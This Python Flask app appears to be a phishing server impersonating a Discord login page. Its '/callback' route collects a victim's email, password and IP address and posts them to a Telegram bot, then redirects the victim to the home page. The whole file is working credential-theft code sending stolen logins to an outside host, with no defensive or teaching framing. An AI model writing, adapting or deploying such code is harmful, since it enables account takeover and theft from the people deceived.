from flask import Flask, render_template, request, redirect
from dotenv import load_dotenv
import requests


app = Flask(__name__)

load_dotenv()

@app.route('/')
def index():
    return 'Hello World!'


@app.route('/discord')
def login():
    return render_template('discord.html')


@app.route('/callback', methods=['POST'])
def page():
    ip_adress = request.remote_addr
    email = request.form['email']
    password = request.form['password']


    text = f'Пользователь ввёл свои данные:\nemail: {email}\npassword: {password}\n\nIP: {ip_adress}'
    send(text)

    return redirect('/')


def send(text = ""):
    TOKEN = app.config['API_KEY']
    CHAT_ID = app.config['CHAT_ID']
    try:
        with requests.Session() as session:
            session.headers['Accept'] = 'text/html,app/xhtml+xml,app/xml;q=0.9,*/*;q=0.8'
            session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'

            url = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}'
            session.post(url, data={'text': f"{text}"})
    except Exception as e:
        print(e)



if __name__ == '__main__':
    app.run(debug=False)